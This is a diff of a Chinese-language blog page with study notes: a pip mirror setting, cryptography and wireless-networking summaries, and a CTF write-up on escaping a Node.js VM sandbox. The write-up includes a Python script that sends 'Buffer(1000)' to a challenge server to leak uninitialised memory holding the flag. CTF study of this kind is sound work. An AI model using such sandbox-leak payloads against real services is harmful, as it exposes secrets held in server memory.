+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在user目录中创建一个pip\pip.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-leaking"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/leaking/"
+    >nodejs沙箱逃逸</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/leaking/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/ctf/">ctf</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>nodejs沙箱逃逸</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwerdkcp2pj30u20ssqfb.jpg" alt="image.png"></p>
+<p>eval(“var flag_” + randomstring.generate(64) + “ = &quot;flag{“ + flag + “}&quot;;”)</p>
+<p>  if (<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12) {</p>
+<p>​    <em>var</em> vm = new VM({</p>
+<p>​      timeout: 1000</p>
+<p>​    });</p>
+<p>​    console.log(<em>req</em>.query.data);</p>
+<p>​    <em>res</em>.send(“eval -&gt;” + vm.run(<em>req</em>.query.data));</p>
+<p>  } else {</p>
+<p>​    <em>res</em>.send(fs.readFileSync(__filename).toString());</p>
+<p>  }</p>
+<p>其中 要满足<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12</p>
+<p>有get data  且长度小于12</p>
+<p>eval -&gt;” + vm.run(<em>req</em>.query.data</p>
+<p>构建payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://111.200.241.244:65075/?data=Buffer(1000)&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;42vk7uq3siu00csvncvn1cr3o4&quot;</span>, <span class="string">&quot;td_cookie&quot;</span>: <span class="string">&quot;298269563&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;W/\&quot;599-+8B/Bay7p6jffTGBFcikJZKicLY\&quot;&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">result</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + re.match(<span class="string">&quot;(.*)flag&#123;(.*)&#125;(.*)&quot;</span>, result).group(<span class="number">2</span>) + <span class="string">&quot;&#125;\n\n\n\n\n\n\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     _thread.start_new_thread(check(req()))</span></span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     print(&quot;error&quot;)</span></span><br><span class="line">        check(req())</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-加密算法总结"
   class="article article-type-post"
   itemscope
@@ -807,6 +807,65 @@
 <h2 id="消息摘要算法"><a href="#消息摘要算法" class="headerlink" title="消息摘要算法"></a>消息摘要算法</h2><p>把信息分为512bit的分组，并且创建一个128bit的摘要</p>
 <p>sha-1 分为512bit的分组， 是160 bit的摘要</p>
 <h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p>如果有数字证书 需要先用CA的公钥验证证书的真伪 再利用发送方的公钥验证发送方消息</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-无线知识总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"
+    >网工 无线知识总结</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/">网络工程师</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="无线知识总结"><a href="#无线知识总结" class="headerlink" title="无线知识总结"></a>无线知识总结</h1><p>中国的3G标准 TD-SCDMA 采用码分多址 </p>
+<p>美国3G标准  CDMA2000</p>
+<p>IEEE   802.11a 是5 Ghz </p>
+<h2 id="无线网主要使用三种通信技术"><a href="#无线网主要使用三种通信技术" class="headerlink" title="无线网主要使用三种通信技术"></a>无线网主要使用三种通信技术</h2><h4 id="红外线-IR"><a href="#红外线-IR" class="headerlink" title="红外线  IR"></a>红外线  IR</h4><h4 id="扩展频谱"><a href="#扩展频谱" class="headerlink" title="扩展频谱"></a>扩展频谱</h4><h5 id="频率跳动扩频FHSS"><a href="#频率跳动扩频FHSS" class="headerlink" title="频率跳动扩频FHSS"></a>频率跳动扩频FHSS</h5><h5 id="直接序列扩频DSSS"><a href="#直接序列扩频DSSS" class="headerlink" title="直接序列扩频DSSS"></a>直接序列扩频DSSS</h5><h4 id="窄带微波"><a href="#窄带微波" class="headerlink" title="窄带微波"></a>窄带微波</h4><h2 id="载波侦听多路访问"><a href="#载波侦听多路访问" class="headerlink" title="载波侦听多路访问"></a>载波侦听多路访问</h2><h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a>CSMA/CA</h3><p>冲突前进行处理</p>
+<p>信道利用率高</p>
+<h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p>冲突后进行处理</p>
+<p>信道利用率高</p>
+<p>s</p>
  
       <!-- reward -->
       
@@ -901,65 +960,6 @@
 <p>然后保存</p>
 <p>这是效果</p>
 <p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211014192201189.png" alt="image-20211014192201189"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-无线知识总结"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"
-    >网工 无线知识总结</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/">网络工程师</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="无线知识总结"><a href="#无线知识总结" class="headerlink" title="无线知识总结"></a>无线知识总结</h1><p>中国的3G标准 TD-SCDMA 采用码分多址 </p>
-<p>美国3G标准  CDMA2000</p>
-<p>IEEE   802.11a 是5 Ghz </p>
-<h2 id="无线网主要使用三种通信技术"><a href="#无线网主要使用三种通信技术" class="headerlink" title="无线网主要使用三种通信技术"></a>无线网主要使用三种通信技术</h2><h4 id="红外线-IR"><a href="#红外线-IR" class="headerlink" title="红外线  IR"></a>红外线  IR</h4><h4 id="扩展频谱"><a href="#扩展频谱" class="headerlink" title="扩展频谱"></a>扩展频谱</h4><h5 id="频率跳动扩频FHSS"><a href="#频率跳动扩频FHSS" class="headerlink" title="频率跳动扩频FHSS"></a>频率跳动扩频FHSS</h5><h5 id="直接序列扩频DSSS"><a href="#直接序列扩频DSSS" class="headerlink" title="直接序列扩频DSSS"></a>直接序列扩频DSSS</h5><h4 id="窄带微波"><a href="#窄带微波" class="headerlink" title="窄带微波"></a>窄带微波</h4><h2 id="载波侦听多路访问"><a href="#载波侦听多路访问" class="headerlink" title="载波侦听多路访问"></a>载波侦听多路访问</h2><h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a>CSMA/CA</h3><p>冲突前进行处理</p>
-<p>信道利用率高</p>
-<h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p>冲突后进行处理</p>
-<p>信道利用率高</p>
-<p>s</p>
  
       <!-- reward -->
       
